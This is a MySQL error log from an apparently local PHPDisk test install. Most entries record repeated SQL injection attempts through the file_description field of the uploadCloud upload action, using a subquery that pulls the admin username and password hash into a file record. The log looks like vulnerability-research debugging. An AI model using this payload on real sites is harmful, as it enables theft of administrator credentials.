<?php exit(); ?>
MySQL Info: 
Error Code: 
Query: Can not connect MySQL server!
Time: 2018-07-23 11:40:43
IP: 172.18.1.1
172.18.1.10|/install/index.php
-------------------------
MySQL Info: Table 'phpdisk.pd_uploadx_files' doesn't exist
Error Code: 1146
Query: select id from pd_uploadx_files where userid='' and file_store_path='2018/07/23/' and file_real_name='' and file_name='aaa.gif'
Time: 2018-07-23 20:32:08
IP: 172.18.1.1
172.18.1.10|/plugins/phpdisk_client/client_sub.php?action=upload_file
-------------------------
MySQL Info: Table 'phpdisk.pd_uploadx_files' doesn't exist
Error Code: 1146
Query: select id from pd_uploadx_files where userid='' and file_store_path='2018/07/23/' and file_real_name='' and file_name='aaa.gif'
Time: 2018-07-23 20:34:02
IP: 172.18.1.1
172.18.1.10|/plugins/phpdisk_client/client_sub.php?action=upload_file
-------------------------
MySQL Info: Column 'file_description' cannot be null
Error Code: 1048
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='0aY3GvaW', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`=NULL, `file_size`='1', `file_time`='1532352098', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:21:38
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: Column 'file_description' cannot be null
Error Code: 1048
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='ET7cK4zf', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`=NULL, `file_size`='1', `file_time`='1532352165', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:22:45
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: Column 'file_description' cannot be null
Error Code: 1048
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='1am1hEFk', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`=NULL, `file_size`='1', `file_time`='1532352296', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:24:56
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='LZqcGnMg', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532352448', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:27:28
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='NThe0kHp', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532352924', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:35:24
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='zHPBZ2dw', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532352968', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:36:08
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='tB8caSr8', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532353003', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-23 21:36:43
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: Column count doesn't match value count at row 2
Error Code: 1136
Query: insert into pd_files(yun_fid,file_name,file_key,file_extension,file_mime,file_description,file_size,file_time,is_checked,in_share,report_status,userid,folder_id,ip) values (1,'a','DRNWGQx3','jpg','application/octet-stream','','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#','1','1532353208','1','0','0','2','1','172.18.1.1') ;
Time: 2018-07-23 21:40:08
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: Column count doesn't match value count at row 2
Error Code: 1136
Query: insert into pd_files(yun_fid,file_name,file_key,file_extension,file_mime,file_description,file_size,file_time,is_checked,in_share,report_status,userid,folder_id,ip) values (1,'a','j48vaj8x','jpg','application/octet-stream','','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#','1','1532402157','1','0','0','2','1','172.18.1.1') ;
Time: 2018-07-24 11:15:57
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: Column count doesn't match value count at row 2
Error Code: 1136
Query: insert into pd_files(yun_fid,file_name,file_key,file_extension,file_mime,file_description,file_size,file_time,is_checked,in_share,report_status,userid,folder_id,ip) values (1,'a','Jo1t7Oxv','jpg','application/octet-stream','','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#','1','1532402986','1','0','0','2','1','172.18.1.1') ;
Time: 2018-07-24 11:29:46
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='O1lHHkcT', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532403097', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-24 11:31:37
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
MySQL Info: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(userna' at line 1
Error Code: 1064
Query: insert into pd_files set `yun_fid`='1', `file_name`='a', `file_key`='88Hp6R68', `file_extension`='jpg', `file_mime`='application/octet-stream', `file_description`='','131','1401643183','1','0','0','2','1','192.168.1.104'),(3,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,0,1532351266,1,0,2,2,-1,'172.18.1.1')#', `file_size`='1', `file_time`='1532403740', `is_checked`='1', `in_share`='0', `report_status`='0', `userid`='2', `folder_id`='1', `ip`='172.18.1.1';
Time: 2018-07-24 11:42:20
IP: 172.18.1.1
172.18.1.10|/ajax.php?action=uploadCloud
-------------------------
